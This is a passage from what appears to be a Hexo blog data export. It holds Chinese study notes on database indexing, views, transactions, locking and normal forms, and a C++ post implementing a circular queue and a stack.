title=\"乐观锁和悲观锁\"></a>乐观锁和悲观锁</h3><p>为保持数据库事务的隔离性，系统必须对并发事务之间的相互作用加以控制。乐观并发控制(乐观锁)和悲观并发控制(悲观锁)是并发控制主要采用的手段。</p>\n<ul>\n<li><strong>乐观锁</strong> : 假定不会发生并发冲突，只是在提交操作时检查是否违反了数据完整性。</li>\n<li><strong>悲观锁</strong> : 假定会发生并发冲突，屏蔽一切可能违反数据完整性操作。</li>\n</ul>\n<blockquote>\n<p>补充说明一下，对于悲观锁来说，如果一个事务操作对一个资源应用了锁时，其他事务只能等待该事务解锁后，再尝试对资源上锁。悲观锁主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护的成本低于回滚事务的成本环境中。</p>\n<p>相对于悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发生冲突了，则返回用户错误的信息，让用户决定如何去做。</p>\n</blockquote>\n<h2 id=\"DELETE、DROP、TRUNCATE\"><a href=\"#DELETE、DROP、TRUNCATE\" class=\"headerlink\" title=\"DELETE、DROP、TRUNCATE\"></a>DELETE、DROP、TRUNCATE</h2><ul>\n<li>想要彻底删除一张表时用drop</li>\n<li>想要删除表中的部分数据用delete并带上where</li>\n<li>想要删除表中数据而保留表用truncate</li>\n</ul>\n<h2 id=\"超键、候选键、主键、外键分别是什么\"><a href=\"#超键、候选键、主键、外键分别是什么\" class=\"headerlink\" title=\"超键、候选键、主键、外键分别是什么\"></a>超键、候选键、主键、外键分别是什么</h2><ul>\n<li>超键：在关系中能唯一标识元组的属性集。一个属性可以作为一个超键，多个属性组合在一起也可以作为一个超键</li>\n<li>候选键：最小超键，即没有冗余的超键</li>\n<li>主键：唯一表示一个元组的键，每个表只有一个主键，且主键不能为空</li>\n<li>一个表中存这另一个表的主键，这个键被成为外键</li>\n</ul>\n<h2 id=\"三范式\"><a href=\"#三范式\" class=\"headerlink\" title=\"三范式\"></a>三范式</h2><ul>\n<li>1NF : 保证数据库表的字段不可再拆分，原子性</li>\n<li>2NF : 不包括部分依赖，即没有属性只依赖主码的一部分</li>\n<li>3NF : 表中不存在可以确定其他非关键字的非键字段</li>\n</ul>\n<p>补充</p>\n<blockquote>\n<p>1NF 消除非主属性对码的部分函数依赖就是 2NF<br>2NF 消除非主属性对码的传递函数依赖就是 3NF<br>3NF 消除了主属性对码的部分和传递函数依赖就是 BCNF</p>\n</blockquote>\n<h2 id=\"个人声明\"><a href=\"#个人声明\" class=\"headerlink\" title=\"个人声明\"></a>个人声明</h2><p>由于文章里面的图片基本上都是在网上找的，所以可能会出现一段时间后，图片链接失效了，无法显示，如果出现这种情况，请给我留言!!!<br>谢谢!!!</p>\n","excerpt":"<h2 id=\"索引\"><a href=\"#索引\" class=\"headerlink\" title=\"索引\"></a>索引</h2><h3 id=\"顺序索引\"><a href=\"#顺序索引\" class=\"headerlink\" title=\"顺序索引\"></a>顺序索引</h3><p><code>聚集索引</code>：　如果包含记录的文件按照某个搜索码指定的顺序排序，那么该搜索码对应的索引称为聚集索引。<br><code>非聚集索引</code>：　搜索码指定的顺序与文件中记录的物理顺序不同的索引称为非聚集索引。</p>\n<p>诸如在大学教师记录文件中，用教师ID作为搜索码，记录按照该搜索码顺序存放。</p>\n<p><code>稠密索引(dense index)</code> : <strong>在稠密索引中，文件中的每一个搜索码值都有一个索引项</strong>。在稠密聚集索引中，索引项包括搜索码值以及指向具有该搜索码的第一条数据记录的指针。具有相同搜索码值的其余记录顺序地存储在第一条数据记录之后，由于该索引是聚集索引，因此记录根据相同的搜索码值排序。而在稠密非聚集索引中，索引必须存储指向所有具有相同搜索码值的记录项的指针列表。</p>\n<blockquote>\n<p>稠密聚集索引具有相同搜索码值的记录按照指定顺序存储；但是稠密非聚集索引必须存储指向一个指针列表，这个列表里面有具有相同搜索码值的记录指针。聚集索引只存储第一条记录的指针，其他的按照顺序查找，非聚集索引就要记录一个指针表。</p>\n</blockquote>\n<p><img src=\"http://www.assignmenthelp.net/assignment_help/images/dense-index-architecture.gif\" alt=\"Dense index\"></p>","more":"<p><code>稀疏索引(sparse index)</code>： <strong>在稀疏索引中，只为搜索码的某些值建立索引索引项</strong>。只有当记录按照搜索码排列顺序存储时才能使用稀疏索引，也就是说，只有索引是聚集索引时才能使用稀疏索引。和稠密索引一样，每个索引项也包括一个搜索码值和指向该搜索码值的第一条记录的指针。为了定位一条记录，我们获取查询记录的搜索码值，再比较索引项中等于或者小于其搜索码值的最大项，然后从该索引项指向的记录开始，沿着文件中的指针查找，直到找到所需记录为止。</p>\n<p><img src=\"http://www.assignmenthelp.net/assignment_help/images/sparse-index-architecture.gif\" alt=\"Sparse index\"></p>\n<blockquote>\n<p>就像图中，索引项中没有为每个搜索码(即右边表格中第二列)设立索引项，但这需要保证这些记录按照搜索码顺序排列才行。</p>\n</blockquote>\n<p><code>多级索引</code>：在外层构建稀疏索引，通过二分查找找到外层索引，外层索引指向内层索引表，内层索引表再找到指定的索引项，最后去定位到记录。<br><img src=\"http://www.cs.montana.edu/~halla/csci440/n18/figure-18-6.png\" alt=\"Two-level index\"></p>\n<p><code>辅助索引</code>：　按聚集索引顺序对文件进行顺序扫描是非常有效的，因为文件中记录的物理存储顺序和索引顺序一致。但是当我们新建立一个索引，而这个索引的顺序跟记录的物理存储顺序不一致时，我们就需要一个辅助索引，这个辅助索引指向每一条记录，这个辅助索引的顺序跟我们要新建的索引顺序一致。</p>\n<p><img src=\"https://raw.githubusercontent.com/alexeygrigorev/wiki-figures/master/ulb/dbsa/ind/secondary-dense-sparse.png\" alt=\"Secondary index\"></p>\n<blockquote>\n<p>从图里面可以看到，我们新建的索引跟blocks的物理存储顺序不一致，为了解决这个问题，中间添加一个辅助索引，这个辅助索引是稠密索引，同时也根据我们新建索引的顺序进行排序。</p>\n</blockquote>\n<h3 id=\"B-树索引\"><a href=\"#B-树索引\" class=\"headerlink\" title=\"B+树索引\"></a>B+树索引</h3><p><img src=\"https://turing.cs.hbg.psu.edu/courses/comp419.taw.s97/btree.gif\" alt=\"B+ tree\"><br>索引顺序文件组织的最大缺点在于，随着文件的增大，索引查找性能和数据顺序扫面性能都会下降。虽然这种性能下降可以通过对文件进行重新组织来弥补，但是我们不希望频繁地进行重组。</p>\n<p>B+树(B+ -tress)索引结构是在数据插入和删除的情况下仍能保持其执行效率的几种使用最广泛的索引结构之一。B+树索引采用平衡树结构，其中树根到树叶的每条路径的长度相同。树中每个非叶子节点有n/2~n个子女，其中n对特定的树是固定的。<br>B+树索引是一种多级索引，但是其结构不同与多级索引顺序文件。典型的B+树结点结构如下 :</p>\n<p><img src=\"http://4.bp.blogspot.com/-LQ2cFeN3_HI/Uy8TXyI0eOI/AAAAAAAACP0/bGH5v8JAPjU/s1600/Structure+of+an+internal+node+of+B++tree.jpg\" alt=\"Internal node\"></p>\n<blockquote>\n<p>这是内部结点结构</p>\n</blockquote>\n<p><img src=\"http://2.bp.blogspot.com/--7OpPitZhoQ/Uy8TVPCxenI/AAAAAAAACPs/lUkMHUTlM2g/s1600/Structure+of+a+leaf+node+of+B++tree.jpg\" alt=\"leaf node\"></p>\n<blockquote>\n<p>这是叶子结点结构，其中key都表示搜索码值，而叶子节点的指针是指向记录块(或者是记录行)，而内部结点是指向下一层的结点。<br>注意到叶子结点只使用了n-1个指针来指向记录，最后一个指针指向自己的兄弟结点，即下一个叶子节点，这样是为了将所有的叶子节点串起来，这样可以发现从最左边的节点开始，可以按照搜索码顺序遍历所有记录行，这为按顺序查找所有记录的SQL语句提供了更加高效的方式。</p>\n</blockquote>\n<h3 id=\"B树索引\"><a href=\"#B树索引\" class=\"headerlink\" title=\"B树索引\"></a>B树索引</h3><p><img src=\"http://www.assignmenthelp.net/assignment_help/images/implementation-B_plus_tree.gif\" alt=\"B tree\"><br>B树索引和B+树索引相似。<strong>两种方法的主要区别在于B树去除了搜索码值存储中冗余</strong>。在上面展示的B+树索引中可以看到搜索码3在结点中出现了两次，每个搜索码值都出现在某些叶子结点中，有的还在非叶子结点中重复出现。</p>\n<p>在B+树中，搜索码值可能同时出现在非叶子结点和叶子结点中。与B+树不同，B树只允许搜索码值出现一次(如果它们是唯一的)。由于B树中搜索码不重复，因此可以用比相应B+树索引更少的树结点来存储索引。然而在B树中，由于出现在非叶子中的搜索码值不会出现在其他地方，因此我们将不得不在非叶子节点中为每个搜索码增加一个指针域。附加的这些指针指向文件记录或相应搜索码所对应的桶中。</p>\n<p>B树叶子结点跟B+树叶子结点一样，不同在于非叶子结点 :<br><img src=\"http://www.assignmenthelp.net/assignment_help/images/B-tree-index-files-assignment-help.gif\" alt=\"\"></p>\n<h3 id=\"散列索引\"><a href=\"#散列索引\" class=\"headerlink\" title=\"散列索引\"></a>散列索引</h3><p>借鉴<code>Java HashMap</code>的具体实现细节，通过仔细了解<code>HashMap</code>可以更加深入了解散列索引。在此推荐一篇讲述<code>HashMap</code>比较好的文章  <a href=\"https://yikun.github.io/2015/04/01/Java-HashMap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/\">Java HashMap工作原理及实现</a></p>\n<h3 id=\"位图索引\"><a href=\"#位图索引\" class=\"headerlink\" title=\"位图索引\"></a>位图索引</h3><p><img src=\"https://mjromeo.files.wordpress.com/2017/01/bitmap_index_example.png?w=646\" alt=\"Bitmap index\"></p>\n<p>简单解释一下，在图中可以发现<code>gender</code>记录项只有m、f两个值，那么系统为这两个值分别建立一个位图，对于m位图来说，记录有多少，位图就有多少位，只有当第i个记录<code>gender</code>为m时，m位图的第i位为1,其他不是m的记录位全为零。概括的说，位图就是表示某一搜索码值出现在了哪些位置，通过遍历搜索码值的位图来查找，诸如下列SQL语句<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> r <span class=\"keyword\">WHERE</span> gender = <span class=\"string\">'f'</span></span><br></pre></td></tr></table></figure></p>\n<p>这样的查询语句通过遍历f的位图是非常高效的。但是位图只是适用于搜索码值频繁出现，且选项少，这里所说的选项少是指比如记录人的性别只有三个选项:<code>男</code>、<code>女</code>、<code>不知道</code>，这样使用位图再适合不过了。通常情况下，位图可以和一般的B+树索引组合起来使用。</p>\n<h3 id=\"MySQL数据库几个基本的索引类型\"><a href=\"#MySQL数据库几个基本的索引类型\" class=\"headerlink\" title=\"MySQL数据库几个基本的索引类型\"></a>MySQL数据库几个基本的索引类型</h3><ul>\n<li><strong>普通索引</strong> : 这是最基本的MySQL数据库索引，它没有任何限制。</li>\n<li><strong>唯一索引</strong> : 它与前面的普通索引类似，不同的就是：MySQL数据库索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。</li>\n<li><strong>主键索引</strong> : 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。</li>\n<li><strong>组合索引</strong> : 多字段建立索引。</li>\n</ul>\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><p>视图这么一个概念我一直不太准确理解，各种参考书上说得太正式，导致我越来越蒙。来我们看一看视图的定义：</p>\n<p><strong>Any relation that is not part of the logical model, but is made visiable to an user as a virtual relation, is called a <code>view</code></strong><br>翻译过来就是<strong>任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系成为视图</strong></p>\n<p>在<code>Database System Concepts</code>这本书里面，作者通过一个例子来引出概念，这个例子如下：</p>\n<blockquote>\n<p>当我们有一张表示银行中每个人借贷记录的表，我们需要知道这张表里面的部分信息，而不是全部信息，基于安全原因，我们会给用户透漏诸如借贷人姓名、借贷号，而不给用户透漏借贷量，我们就需要定义一个查询语句，只返回这张表的部分信息。此外我们可能需要其他的信息，而这些信息需要union多张表，但是这样的信息查询又是比较频繁的，我们也需要定义一个查询语句，来返回结果。</p>\n</blockquote>\n<p>基于上述的例子，作者就引出了视图的概念。而我对于这个的理解是：我们需要基于两方面考虑，<strong>一个是安全性</strong>，当我们在使用mysql数据库的时候，数据库里面总是有一些视图表，里面包含了当前用户的所有数据库信息，诸如有哪些表，表里都有哪些属性这类信息。所有的可视范围在于当前用户的权限之内，权限之外就无法查看到，那么可以使用视图定义一个查询，根据用户权限，返回整个数据库中用户应该看到的东西。<strong>另一个考虑是简单性</strong>，我的理解是当我们需要较频繁进行一些查询时，我们总是要频繁的编写复杂的查询语句，为了简化，我们把这些频繁查询进行一定程度的封装，给用户展示一个简单的视图名，让用户能够直截了当的理解这个视图的作用，然后直接查询视图结果。</p>\n<p>(这一段是我自己的理解，可能有误解)可能有人会这样选择，上述为了简化查询，为什么要使用视图，不直接使用新表，新表的构建通过其他表变化触发。如果我们使用表，那么我们可能要为每个频繁查找的语句创建一个合适的表，这样的后果是，数据库的表增多，而且表与表之间的关系更加复杂。虽然我们在学习数据库的时候常常让其遵守三范式，但这样会导致如果因为前期表的设计有问题，或者后期需要变化表，那么修改起来是一个非常巨大的工程，非常困难。相反视图并不在数据库中以存储的数据值集形式存在，修改起来是很方便的。</p>\n<p>此外可能还有一个经常被问的问题是<strong>视图什么时候更新？因为视图是一种虚关系，所以是查询时更新，通俗一点就是，当底层的表有修改时，是去触发视图更新，还是当我们要用使用视图的时候更新。答案是后者，因为实质上视图还是一个查询语句，而不是表，每次使用视图，都需要重新执行视图定义的查询</strong></p>\n<h2 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h2><h3 id=\"事务概念\"><a href=\"#事务概念\" class=\"headerlink\" title=\"事务概念\"></a>事务概念</h3><p><strong>事务</strong>是访问并可能更新各种数据项的一个程序执行单元。我们通常要求数据库系统维护事务的以下性质</p>\n<ul>\n<li><strong>原子性(Atom)</strong>：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映。</li>\n<li><strong>一致性(Consistency)</strong>：隔离执行事务时(换言之，在没有其他事务并发执行的情况下)保持数据库的一致性</li>\n<li><strong>隔离性(Isolation)</strong>：尽管多个事务可能并发执行，但是系统保证，对于任何一对事务Ti和Tj，在Ti看来，Tj要么Ti开始之前已经完成执行，要么在Ti完成孩子后开始执行。因此，每个事务都感觉不到系统中有其他事务在并发地执行。</li>\n<li><strong>持久性(Durability)</strong>：一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障。</li>\n</ul>\n<p>这些性质通常成为ACID特性</p>\n<h3 id=\"事务隔离级别\"><a href=\"#事务隔离级别\" class=\"headerlink\" title=\"事务隔离级别\"></a>事务隔离级别</h3><ul>\n<li><strong>可串行化(serializable)</strong> : 通常保证可串行化调度。然而正如我们将要解释的，一些数据库系统对该隔离性级别的实现在某些情况下允许非可串行化执行。</li>\n<li><strong>可重复读(repeatable read)</strong> : 只允许读取已经提交数据，而且在一个事务两次读取一个数据项期间，其他事务不得更新该数据。但该事务不要求与其他事务可串行化。</li>\n<li><strong>已提交读(read committed)</strong> : 只允许读取已提交数据，但不要求可重复度。比如在事务两次读取一个数据项期间，另一个事务更新了该数据并提交。</li>\n<li><strong>未提交读(read uncommitted)</strong> : 允许读取未提交数据。这是SQL允许的最低一致性级别。</li>\n</ul>\n<h3 id=\"乐观锁和悲观锁\"><a href=\"#乐观锁和悲观锁\" class=\"headerlink\" title=\"乐观锁和悲观锁\"></a>乐观锁和悲观锁</h3><p>为保持数据库事务的隔离性，系统必须对并发事务之间的相互作用加以控制。乐观并发控制(乐观锁)和悲观并发控制(悲观锁)是并发控制主要采用的手段。</p>\n<ul>\n<li><strong>乐观锁</strong> : 假定不会发生并发冲突，只是在提交操作时检查是否违反了数据完整性。</li>\n<li><strong>悲观锁</strong> : 假定会发生并发冲突，屏蔽一切可能违反数据完整性操作。</li>\n</ul>\n<blockquote>\n<p>补充说明一下，对于悲观锁来说，如果一个事务操作对一个资源应用了锁时，其他事务只能等待该事务解锁后，再尝试对资源上锁。悲观锁主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护的成本低于回滚事务的成本环境中。</p>\n<p>相对于悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发生冲突了，则返回用户错误的信息，让用户决定如何去做。</p>\n</blockquote>\n<h2 id=\"DELETE、DROP、TRUNCATE\"><a href=\"#DELETE、DROP、TRUNCATE\" class=\"headerlink\" title=\"DELETE、DROP、TRUNCATE\"></a>DELETE、DROP、TRUNCATE</h2><ul>\n<li>想要彻底删除一张表时用drop</li>\n<li>想要删除表中的部分数据用delete并带上where</li>\n<li>想要删除表中数据而保留表用truncate</li>\n</ul>\n<h2 id=\"超键、候选键、主键、外键分别是什么\"><a href=\"#超键、候选键、主键、外键分别是什么\" class=\"headerlink\" title=\"超键、候选键、主键、外键分别是什么\"></a>超键、候选键、主键、外键分别是什么</h2><ul>\n<li>超键：在关系中能唯一标识元组的属性集。一个属性可以作为一个超键，多个属性组合在一起也可以作为一个超键</li>\n<li>候选键：最小超键，即没有冗余的超键</li>\n<li>主键：唯一表示一个元组的键，每个表只有一个主键，且主键不能为空</li>\n<li>一个表中存这另一个表的主键，这个键被成为外键</li>\n</ul>\n<h2 id=\"三范式\"><a href=\"#三范式\" class=\"headerlink\" title=\"三范式\"></a>三范式</h2><ul>\n<li>1NF : 保证数据库表的字段不可再拆分，原子性</li>\n<li>2NF : 不包括部分依赖，即没有属性只依赖主码的一部分</li>\n<li>3NF : 表中不存在可以确定其他非关键字的非键字段</li>\n</ul>\n<p>补充</p>\n<blockquote>\n<p>1NF 消除非主属性对码的部分函数依赖就是 2NF<br>2NF 消除非主属性对码的传递函数依赖就是 3NF<br>3NF 消除了主属性对码的部分和传递函数依赖就是 BCNF</p>\n</blockquote>\n<h2 id=\"个人声明\"><a href=\"#个人声明\" class=\"headerlink\" title=\"个人声明\"></a>个人声明</h2><p>由于文章里面的图片基本上都是在网上找的，所以可能会出现一段时间后，图片链接失效了，无法显示，如果出现这种情况，请给我留言!!!<br>谢谢!!!</p>"},{"title":"数据结构c++","date":"2016-07-23T07:18:23.000Z","_content":"\n### 1.数据结构之队列\n<!--more-->\n**数据结构中的队列所遵循的原则是先进先出的排队原则，即先存放的先先取出。同时队列分为普通队列和环形队列，其中普通队列是非闭合队列，效率和利用率低；相反，环形队列为首尾闭合的队列，可以实现不断取出又不断放进，效率和利用率高。**\n\n**队列有列首、列尾、列容量、列长度等名词，在此不解释了。**\n\n**接下来放代码**\nCustomer.h中的代码\n``` c++\n# ifndef CUSTOMER_H\n# define CUSTOMER_H\n\n# include <string>\nusing namespace std;\n\nclass Customer\n{\npublic:\n\tCustomer(string name = \"\", int age = 0);\n\tvoid printInfo() const;\nprivate:\n\tstring m_strName;\n\tint m_iAge;\n};\n\n# endif\n```\n\nCustomer.cpp中的代码\n``` c++\n# include <iostream>\n# include \"Customer.h\"\nusing namespace std;\n\nCustomer::Customer(string name, int age)\n{\n\tm_strName = name;\n\tm_iAge = age;\n}\n\nvoid Customer::printInfo() const\n{\n\tcout << \"姓名\" << m_strName << endl;\n\tcout << \"年龄\" << m_iAge << endl;\n}\n```\n\nMyQueue.cpp中的代码\n``` c++\n# include \"MyQueue.h\"\n# include <iostream>\nusing namespace std;\n\nMyQueue::MyQueue(int queueCapacity)\n{\n\tm_iQueueCapacity = queueCapacity;\n\tm_pQueue = new Customer[m_iQueueCapacity];\n\tClearQueue();\n}\n\nMyQueue::~MyQueue()\n{\n\tdelete []m_pQueue;\n\tm_pQueue = NULL;\n}\n\nvoid MyQueue::ClearQueue()\n{\n\tm_iHead = 0;\n\tm_iTail = 0;\n\tm_iQueueLen = 0;\n}\n\nbool MyQueue::QueueEmpty() const\n{\n\tif (m_iQueueLen == 0)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nint MyQueue::QueueLength() const\n{\n\treturn m_iQueueLen;\n}\n\nbool MyQueue::QueueFull() const\n{\n\tif (m_iQueueLen == m_iQueueCapacity)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool MyQueue::EnQueue(Customer element)\n{\n\tif (QueueFull())\n\t{\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\tm_pQueue[m_iTail] = element;\n\t\tm_iTail++;\n\t\tm_iTail = m_iTail % m_iQueueCapacity;\n\t\tm_iQueueLen++;\n\t\treturn true;\n\t}\n}\n\nbool MyQueue::DeQueue(Customer &element)\n{\n\tif (QueueEmpty())\n\t{\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\telement = m_pQueue[m_iHead];\n\t\tm_iHead++;\n\t\tm_iHead = m_iHead % m_iQueueCapacity;\n\t\tm_iQueueLen--;\n\t\treturn true;\n\t}\n}\n\nvoid MyQueue::QueueTraverse()\n{\n\tfor (int i = m_iHead; i < m_iQueueLen + m_iHead; i++)\n\t{\n\t\tm_pQueue[i%m_iQueueCapacity].printInfo();\n\t\tcout << \"前面还有\" << (i-m_iHead) << \"人\" << endl; \n\t\tcout << endl;\n\t}\n\tcout << endl;\n}\n```\n\nMyQueue.h中的代码\n``` c++\n# ifndef MYQUEUE_H\n# define MYQUEUE_H\n\n# include \"Customer.h\"\n\nclass MyQueue\n{\npublic:\n\tMyQueue(int queueCapacity);         //创建队列\n\tvirtual ~MyQueue();                 //销毁队列\n\tvoid ClearQueue();                  //清空队列\n\tbool QueueEmpty() const;            //判空队列\n\tbool QueueFull() const;             //判满队列\n\tint QueueLength() const;            //队列长度\n\tbool EnQueue(Customer element);     //新元素入队\n\tbool DeQueue(Customer &element);    //首元素出队\n\tvoid QueueTraverse();               //遍历队列\nprivate:\n\tCustomer *m_pQueue;                     //队列数组指针\n\tint m_iQueueLen;                        //队列元素个数\n\tint m_iQueueCapacity;                   //队列数组容量\n\tint m_iHead;\n\tint m_iTail;\n};\n\n# endif\n```\n\ndemo.cpp中的代码\n``` c++\n# include <iostream>\n# include <stdlib.h>\n# include \"MyQueue.h\"\n# include \"Customer.h\"\nusing namespace std;\n\nint main(void)\n{\n\tMyQueue *p = new MyQueue(4);\n\tCustomer c1(\"张三\",20);\n\tCustomer c2(\"李四\",30);\n\tCustomer c3(\"王五\",25);\n\n\tp->EnQueue(c1);\n\tp->EnQueue(c2);\n\tp->EnQueue(c3);\n\n\tp->QueueTraverse();\n\n\tCustomer c4(\"\",0);\n\tp->DeQueue(c4);\n\tc4.printInfo();\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n\n### 2.数据结构之栈\n\n**讲真，假期学习真的好难，我好不容易静下心来再学，其实之前已经学了，只是博客没做记录，今天补上。栈是很简单的模型，就是相当于一个瓶子，放东西进去，先放的在下面，后放的在上面，所以遵循后进先出原则，栈的栈底始终不变，栈顶随放入数量增加而上升。差不多就这些，今天的代码很简单，遵循我写代码不麻烦，理解容易原则**\n\n**接下来放代码**\n**MyStack.h**\n``` c++\n# ifndef MYSTACK_H\n# define MYSTACK_H\n\nclass MyStack\n{\npublic:\n\tMyStack(int size);                       //分配内存初始化栈空间，设定栈容量，栈顶\n\t~MyStack();                              //回收栈空间内存\n\tbool stackEmpty();                       //判断栈是否为空，为空返回true,非空返回false\n\tbool stackFull();                        //判断栈是否为满，为满返回true，非满返回false\n\tvoid clearStack();                       //清空栈\n\tint stackLength();                       //已有元素个数\n\tbool push(char elem);                    //元素入栈，栈顶上升\n\tbool pop(char &elem);                    //元素出栈，栈顶下降\n\tvoid stackTraverse(bool isFromButtorm);  //遍历栈中所有元素\n\nprivate:\n\tchar *m_pBuffer;              //栈空间指针\n\tint m_iSize;                  //栈容量\n\tint m_iTop;                   //栈顶，栈中元素个数\n};\n\n# endif \n```\n\n**MyStack.cpp**\n``` c++\n# include \"MyStack.h\"\n# include <iostream>\nusing namespace std;\n\nMyStack::MyStack(int size)\n{\n\tm_iSize = size;\n\tm_pBuffer = new char[size];\n\tm_iTop = 0;\n}\n\nMyStack::~MyStack()\n{\n\tdelete []m_pBuffer;\n}\n\nbool MyStack::stackEmpty()\n{\n\tif (0 == m_iTop)       //此处为了优秀代码，也可写成 m_iTop == 0;\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool MyStack::stackFull()\n{\n\tif (m_iTop == m_iSize)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nvoid MyStack::clearStack()\n{\n\tm_iTop = 0;\n}\n\nint MyStack::stackLength()\n{\n\treturn m_iTop;\n}\n\nbool MyStack::push(char elem)\n{\n\tif (stackFull())\n\t{\n\t\treturn false;\n\t}\n\tm_pBuffer[m_iTop] = elem;\n\tm_iTop++;\n\treturn true;\n}\n\nbool MyStack::pop(char &elem)\n{\n\tif (stackEmpty())\n\t{\n\t\treturn false;\n\t}\n\tm_iTop--;\n\telem = m_pBuffer[m_iTop];\n\treturn true;\n}\n\nvoid MyStack::stackTraverse(bool isFromButtorm)\n{\n\tif (isFromButtorm)\n\t{\n\t\tfor (int i = 0; i < m_iTop; i++)\n\t\t{\n\t\t\tcout << m_pBuffer[i] << \",\";\n\t\t}\n\t}\n\telse\n\t{\n\t\tfor (int i = m_iTop-1; i >= 0; i--)\n\t\t{\n\t\t\tcout << m_pBuffer[i] << \",\";\n\t\t}\n\t}\n}\n```\n\n**demo.cpp**\n``` c++\n# include <stdlib.h>\n# include \"MyStack.h\"\n# include <iostream>\nusing namespace std;\n\nint main(void)\n{\n\tMyStack *pStack = new MyStack(5);\n\n\tpStack->push('h');\n\tpStack->push('e');\n\tpStack->push('l');\n\tpStack->push('l');\n\tpStack->push('o');\n\n\tpStack->stackTraverse(true);\n\n\tchar elem = 0;\n\tpStack->pop(elem);\n\n\tpStack->stackTraverse(true);\n\n\t//pStack->clearStack();\n\n\tcout << pStack->stackLength() << endl;\n\n\tif (pStack->stackEmpty())\n\t{\n\t\tcout << \"栈为空\" << endl;\n\t}\n\n\tif (pStack->stackFull())\n\t{\n\t\tcout << \"栈为满\" << endl;\n\t}\n\n\tdelete pStack;\n\tpStack = NULL;\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n```","source":"_posts/数据结构.md","raw":"---\ntitle: 数据结构c++\ntags: 数据结构\ndate: 2016-07-23 15:18:23\ncategories: 数据结构\n---\n\n### 1.数据结构之队列\n<!--more-->\n**数据结构中的队列所遵循的原则是先进先出的排队原则，即先存放的先先取出。同时队列分为普通队列和环形队列，其中普通队列是非闭合队列，效率和利用率低；相反，环形队列为首尾闭合的队列，可以实现不断取出又不断放进，效率和利用率高。**\n\n**队列有列首、列尾、列容量、列长度等名词，在此不解释了。**\n\n**接下来放代码**\nCustomer.h中的代码\n``` c++\n# ifndef CUSTOMER_H\n# define CUSTOMER_H\n\n# include <string>\nusing namespace std;\n\nclass Customer\n{\npublic:\n\tCustomer(string name = \"\", int age = 0);\n\tvoid printInfo() const;\nprivate:\n\tstring m_strName;\n\tint m_iAge;\n};\n\n# endif\n```\n\nCustomer.cpp中的代码\n``` c++\n# include <iostream>\n# include \"Customer.h\"\nusing namespace std;\n\nCustomer::Customer(string name, int age)\n{\n\tm_strName = name;\n\tm_iAge = age;\n}\n\nvoid Customer::printInfo() const\n{\n\tcout << \"姓名\" << m_strName << endl;\n\tcout << \"年龄\" << m_iAge << endl;\n}\n```\n\nMyQueue.cpp中的代码\n``` c++\n# include \"MyQueue.h\"\n# include <iostream>\nusing namespace std;\n\nMyQueue::MyQueue(int queueCapacity)\n{\n\tm_iQueueCapacity = queueCapacity;\n\tm_pQueue = new Customer[m_iQueueCapacity];\n\tClearQueue();\n}\n\nMyQueue::~MyQueue()\n{\n\tdelete []m_pQueue;\n\tm_pQueue = NULL;\n}\n\nvoid MyQueue::ClearQueue()\n{\n\tm_iHead = 0;\n\tm_iTail = 0;\n\tm_iQueueLen = 0;\n}\n\nbool MyQueue::QueueEmpty() const\n{\n\tif (m_iQueueLen == 0)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nint MyQueue::QueueLength() const\n{\n\treturn m_iQueueLen;\n}\n\nbool MyQueue::QueueFull() const\n{\n\tif (m_iQueueLen == m_iQueueCapacity)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool MyQueue::EnQueue(Customer element)\n{\n\tif (QueueFull())\n\t{\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\tm_pQueue[m_iTail] = element;\n\t\tm_iTail++;\n\t\tm_iTail = m_iTail % m_iQueueCapacity;\n\t\tm_iQueueLen++;\n\t\treturn true;\n\t}\n}\n\nbool MyQueue::DeQueue(Customer &element)\n{\n\tif (QueueEmpty())\n\t{\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\telement = m_pQueue[m_iHead];\n\t\tm_iHead++;\n\t\tm_iHead = m_iHead % m_iQueueCapacity;\n\t\tm_iQueueLen--;\n\t\treturn true;\n\t}\n}\n\nvoid MyQueue::QueueTraverse()\n{\n\tfor (int i = m_iHead; i < m_iQueueLen + m_iHead; i++)\n\t{\n\t\tm_pQueue[i%m_iQueueCapacity].printInfo();\n\t\tcout << \"前面还有\" << (i-m_iHead) << \"人\" << endl; \n\t\tcout << endl;\n\t}\n\tcout << endl;\n}\n```\n\nMyQueue.h中的代码\n``` c++\n# ifndef MYQUEUE_H\n# define MYQUEUE_H\n\n# include \"Customer.h\"\n\nclass MyQueue\n{\npublic:\n\tMyQueue(int queueCapacity);         //创建队列\n\tvirtual ~MyQueue();                 //销毁队列\n\tvoid ClearQueue();                  //清空队列\n\tbool QueueEmpty() const;            //判空队列\n\tbool QueueFull() const;             //判满队列\n\tint QueueLength() const;            //队列长度\n\tbool EnQueue(Customer element);     //新元素入队\n\tbool DeQueue(Customer &element);    //首元素出队\n\tvoid 